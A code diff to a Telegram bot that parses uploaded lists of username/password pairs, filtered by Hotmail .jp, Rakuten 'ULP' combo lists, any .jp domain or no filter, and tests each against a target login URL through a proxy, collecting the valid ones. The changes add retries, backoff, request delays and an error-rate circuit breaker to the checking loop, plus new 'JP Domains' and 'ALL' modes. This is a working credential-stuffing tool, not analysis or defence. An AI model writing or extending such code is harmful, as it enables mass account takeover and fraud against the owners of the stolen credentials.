@@ -1,6 +1,8 @@
 const { Markup } = require('telegraf');
 const {
   prepareBatchFromFile,
+  prepareAllBatch,
+  prepareJpBatch,
   prepareUlpBatch,
   ALLOWED_DOMAINS,
   MAX_BYTES_HOTMAIL,
@@ -43,11 +45,16 @@ const { createLogger } = require('../logger');
 
 const log = createLogger('batch');
 
-const BATCH_CONCURRENCY = Math.max(
-  1,
-  parseInt(process.env.BATCH_CONCURRENCY, 10) || 8 // default increased from 3 to 8
-);
-const TELEGRAM_FILE_LIMIT_BYTES = 20 * 1024 * 1024; // Telegram bot API download limit (~20MB)
+// Batch processing configuration
+const BATCH_CONCURRENCY = Math.max(1, parseInt(process.env.BATCH_CONCURRENCY, 10) || 1); // default 1 for stability
+const MAX_RETRIES = parseInt(process.env.BATCH_MAX_RETRIES, 10) || 1; // reduced retries
+const REQUEST_DELAY_MS = parseInt(process.env.BATCH_DELAY_MS, 10) || 500; // delay between requests
+const PROGRESS_UPDATE_INTERVAL_MS = 2000; // update every 2s
+const ERROR_THRESHOLD_PERCENT = 60; // pause if error rate exceeds this
+const ERROR_WINDOW_SIZE = 5; // check last N results for error rate
+const CIRCUIT_BREAKER_PAUSE_MS = 3000; // pause when circuit breaker triggers
+
+const TELEGRAM_FILE_LIMIT_BYTES = 20 * 1024 * 1024;
 const pendingBatches = new Map();
 const pendingFiles = new Map();
 const PROCESSED_TTL_MS = parseInt(process.env.PROCESSED_TTL_MS, 10) || DEFAULT_TTL_MS;
@@ -78,25 +85,107 @@ function runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, 
   const validCreds = [];
   const startedAt = Date.now();
   let lastProgressAt = startedAt;
+  
+  // Circuit breaker state
+  const recentResults = []; // sliding window of recent results
+  let circuitBreakerTripped = false;
+  let consecutiveErrors = 0;
 
-  log.info(`[batch] executing file=${batch.filename} total=${batch.count}`);
+  log.info(`[batch] executing file=${batch.filename} total=${batch.count} concurrency=${BATCH_CONCURRENCY}`);
 
   const iterator = batch.creds[Symbol.iterator]();
 
-  const processCredential = async (cred) => {
+  // Progress update - blocking to ensure message gets updated
+  const updateProgress = async (force = false) => {
     if (batch.aborted) return;
-    let result;
-    const credKey = cred._dedupeKey || makeKey(cred.username, cred.password);
+    
+    const now = Date.now();
+    if (!force && now - lastProgressAt < PROGRESS_UPDATE_INTERVAL_MS) return;
+    
+    lastProgressAt = now;
+    
+    const text = buildBatchProgress({
+      filename: batch.filename,
+      processed,
+      total: batch.count,
+      counts,
+    });
+
     try {
-      result = await checkCredentials(cred.username, cred.password, {
-        timeoutMs: options.timeoutMs || 60000,
-        proxy: options.proxy,
-        screenshotOn: false,
-        targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
-        headless: options.headless,
+      await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
+        parse_mode: 'MarkdownV2',
       });
     } catch (err) {
-      result = { status: 'ERROR', message: err.message };
+      // Only log if not a "message not modified" error
+      if (!err.message?.includes('message is not modified')) {
+        log.debug(`Progress update failed: ${err.message}`);
+      }
+    }
+  };
+
+  // Check if we should pause due to high error rate
+  const checkCircuitBreaker = () => {
+    if (recentResults.length < ERROR_WINDOW_SIZE) return false;
+    
+    const errorCount = recentResults.filter(r => r === 'ERROR').length;
+    const errorRate = (errorCount / recentResults.length) * 100;
+    
+    if (errorRate >= ERROR_THRESHOLD_PERCENT) {
+      if (!circuitBreakerTripped) {
+        circuitBreakerTripped = true;
+        log.warn(`[batch] Circuit breaker: ${errorRate.toFixed(0)}% errors in last ${ERROR_WINDOW_SIZE} - pausing ${CIRCUIT_BREAKER_PAUSE_MS}ms`);
+      }
+      return true;
+    }
+    
+    circuitBreakerTripped = false;
+    return false;
+  };
+
+  const processCredential = async (cred) => {
+    if (batch.aborted) return;
+    
+    // Check circuit breaker before processing
+    if (checkCircuitBreaker()) {
+      await new Promise(r => setTimeout(r, CIRCUIT_BREAKER_PAUSE_MS));
+      recentResults.length = 0; // reset window after pause
+      consecutiveErrors = 0;
+    }
+    
+    let result;
+    const credKey = cred._dedupeKey || makeKey(cred.username, cred.password);
+    
+    // Retry loop for ERROR results
+    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
+      if (batch.aborted) return;
+      
+      try {
+        result = await checkCredentials(cred.username, cred.password, {
+          timeoutMs: options.timeoutMs || 60000,
+          proxy: options.proxy,
+          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
+        });
+      } catch (err) {
+        result = { status: 'ERROR', message: err.message };
+      }
+      
+      // Only retry on ERROR
+      if (result.status !== 'ERROR' || attempt >= MAX_RETRIES) break;
+      
+      log.debug(`[batch] Retry ${cred.username} (${attempt + 2}/${MAX_RETRIES + 1}): ${result.message}`);
+      // Exponential backoff: 500ms, 1000ms, 2000ms...
+      await new Promise(r => setTimeout(r, (500 * Math.pow(2, attempt)) + Math.random() * 300));
+    }
+
+    // Track for circuit breaker
+    recentResults.push(result.status);
+    if (recentResults.length > ERROR_WINDOW_SIZE) recentResults.shift();
+    
+    // Track consecutive errors
+    if (result.status === 'ERROR') {
+      consecutiveErrors++;
+    } else {
+      consecutiveErrors = 0;
     }
 
     counts[result.status] = (counts[result.status] || 0) + 1;
@@ -106,52 +195,52 @@ function runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, 
       validCreds.push({ username: cred.username, password: cred.password });
     }
 
-    markProcessedStatus(credKey, result.status, PROCESSED_TTL_MS).catch((err) => {
-      log.warn(`Unable to record processed status: ${err.message}`);
-    });
-
-    if (batch.aborted) return;
-
-    const now = Date.now();
-    const shouldUpdate =
-      processed === 1 ||
-      processed === batch.count ||
-      processed % 5 === 0 ||
-      now - lastProgressAt >= 5000;
-
-    if (shouldUpdate) {
-      const text = buildBatchProgress({
-        filename: batch.filename,
-        processed,
-        total: batch.count,
-        counts,
-      });
-
-      try {
-        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
-          parse_mode: 'MarkdownV2',
-        });
-      } catch (_) {
-        log.warn('Batch progress edit failed');
-      }
-
-      lastProgressAt = now;
-    }
+    // Non-blocking cache update
+    markProcessedStatus(credKey, result.status, PROCESSED_TTL_MS).catch(() => {});
+    
+    return result;
   };
 
-  const worker = async () => {
-    for (;;) {
-      if (batch.aborted) return;
-      const next = iterator.next();
-      if (next.done) return;
-      await processCredential(next.value);
+  // Process credentials in chunks - wait for entire chunk to complete before next
+  const processInChunks = async () => {
+    const allCreds = batch.creds;
+    const chunkSize = BATCH_CONCURRENCY;
+    
+    for (let i = 0; i < allCreds.length; i += chunkSize) {
+      if (batch.aborted) break;
+      
+      // Check circuit breaker before each chunk
+      if (checkCircuitBreaker()) {
+        await new Promise(r => setTimeout(r, CIRCUIT_BREAKER_PAUSE_MS));
+        recentResults.length = 0;
+      }
+      
+      const chunk = allCreds.slice(i, i + chunkSize);
+      const chunkNum = Math.floor(i / chunkSize) + 1;
+      const totalChunks = Math.ceil(allCreds.length / chunkSize);
+      
+      log.debug(`[batch] Processing chunk ${chunkNum}/${totalChunks} (${chunk.length} credentials)`);
+      
+      // Process credentials - sequentially if concurrency is 1, parallel otherwise
+      if (chunkSize === 1) {
+        await processCredential(chunk[0]);
+      } else {
+        await Promise.all(chunk.map(cred => processCredential(cred)));
+      }
+      
+      // Update progress after each chunk completes (blocking)
+      await updateProgress(true);
+      
+      // Delay between chunks to avoid overwhelming the server
+      if (i + chunkSize < allCreds.length && REQUEST_DELAY_MS > 0) {
+        await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
+      }
     }
   };
 
   const execute = async () => {
     try {
-      const poolSize = Math.min(BATCH_CONCURRENCY, batch.creds.length);
-      await Promise.all(Array.from({ length: poolSize }, () => worker()));
+      await processInChunks();
 
       const elapsed = Date.now() - startedAt;
       const summary = batch.aborted
@@ -252,6 +341,10 @@ function registerBatchHandlers(bot, options, helpers) {
         [
           Markup.button.callback('📧 HOTMAIL (.jp)', `batch_type_hotmail_${sourceMessageId}`),
           Markup.button.callback('📄 ULP (Rakuten)', `batch_type_ulp_${sourceMessageId}`),
+        ],
+        [
+          Markup.button.callback('🇯🇵 JP Domains', `batch_type_jp_${sourceMessageId}`),
+          Markup.button.callback('📋 ALL', `batch_type_all_${sourceMessageId}`),
         ],
         [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
       ]),
@@ -555,6 +648,176 @@ function registerBatchHandlers(bot, options, helpers) {
         ]),
       }
     );
+  });
+
+  // ALL mode - no domain filtering
+  bot.action(/batch_type_all_(.+)/, async (ctx) => {
+    await ctx.answerCbQuery();
+    const msgId = ctx.match[1];
+    const key = `${ctx.chat.id}:${msgId}`;
+    const file = pendingFiles.get(key);
+    if (!file) {
+      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    try {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        ctx.update.callback_query.message.message_id,
+        undefined,
+        escapeV2('⏳ Parsing all credentials (no filter)...'),
+        { parse_mode: 'MarkdownV2' }
+      );
+    } catch (_) {}
+
+    let batch;
+    try {
+      batch = await prepareAllBatch(file.fileUrl, MAX_BYTES_HOTMAIL);
+      log.info(`[batch][all] parsed count=${batch.count} file=${file.filename}`);
+    } catch (err) {
+      await ctx.reply(buildBatchParseFailed(err.message), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      log.warn(`[batch][all] parse failed file=${file.filename} msg=${err.message}`);
+      return;
+    }
+
+    if (!batch.count) {
+      await ctx.reply(escapeV2('⚠️ No valid credentials found in file.'), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
+    if (!filtered.length) {
+      await ctx.reply(buildAllProcessed('in this file'), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    batch.creds = filtered;
+    batch.count = filtered.length;
+    batch.skipped = skipped;
+
+    pendingFiles.delete(key);
+    pendingBatches.set(key, {
+      creds: batch.creds,
+      filename: file.filename,
+      count: batch.count,
+      skipped: batch.skipped,
+      sourceMessageId: Number(msgId),
+    });
+
+    const msg = escapeV2(`📋 ALL Mode (no filter)\n`) +
+      escapeV2(`📄 File: `) + codeSpan(file.filename) + escapeV2(`\n`) +
+      escapeV2(`📊 Found: ${batch.count} credentials\n`) +
+      (batch.skipped ? escapeV2(`⏭️ Skipped: ${batch.skipped} (already processed)\n`) : '') +
+      escapeV2(`\nReady to process?`);
+
+    await ctx.reply(msg, {
+      parse_mode: 'MarkdownV2',
+      reply_to_message_id: Number(msgId),
+      ...Markup.inlineKeyboard([
+        [
+          Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
+          Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
+        ],
+      ]),
+    });
+  });
+
+  // JP Domains mode - any .jp domain
+  bot.action(/batch_type_jp_(.+)/, async (ctx) => {
+    await ctx.answerCbQuery();
+    const msgId = ctx.match[1];
+    const key = `${ctx.chat.id}:${msgId}`;
+    const file = pendingFiles.get(key);
+    if (!file) {
+      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    try {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        ctx.update.callback_query.message.message_id,
+        undefined,
+        escapeV2('⏳ Parsing .jp domain credentials...'),
+        { parse_mode: 'MarkdownV2' }
+      );
+    } catch (_) {}
+
+    let batch;
+    try {
+      batch = await prepareJpBatch(file.fileUrl, MAX_BYTES_HOTMAIL);
+      log.info(`[batch][jp] parsed count=${batch.count} file=${file.filename}`);
+    } catch (err) {
+      await ctx.reply(buildBatchParseFailed(err.message), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      log.warn(`[batch][jp] parse failed file=${file.filename} msg=${err.message}`);
+      return;
+    }
+
+    if (!batch.count) {
+      await ctx.reply(escapeV2('⚠️ No .jp domain credentials found in file.'), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
+    if (!filtered.length) {
+      await ctx.reply(buildAllProcessed('in this file'), {
+        parse_mode: 'MarkdownV2',
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    batch.creds = filtered;
+    batch.count = filtered.length;
+    batch.skipped = skipped;
+
+    pendingFiles.delete(key);
+    pendingBatches.set(key, {
+      creds: batch.creds,
+      filename: file.filename,
+      count: batch.count,
+      skipped: batch.skipped,
+      sourceMessageId: Number(msgId),
+    });
+
+    const msg = escapeV2(`🇯🇵 JP Domains Mode\n`) +
+      escapeV2(`📄 File: `) + codeSpan(file.filename) + escapeV2(`\n`) +
+      escapeV2(`📊 Found: ${batch.count} credentials (*.jp)\n`) +
+      (batch.skipped ? escapeV2(`⏭️ Skipped: ${batch.skipped} (already processed)\n`) : '') +
+      escapeV2(`\nReady to process?`);
+
+    await ctx.reply(msg, {
+      parse_mode: 'MarkdownV2',
+      reply_to_message_id: Number(msgId),
+      ...Markup.inlineKeyboard([
+        [
+          Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
+          Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
+        ],
+      ]),
+    });
   });
 
   bot.action(/batch_abort_(.+)/, async (ctx) => {
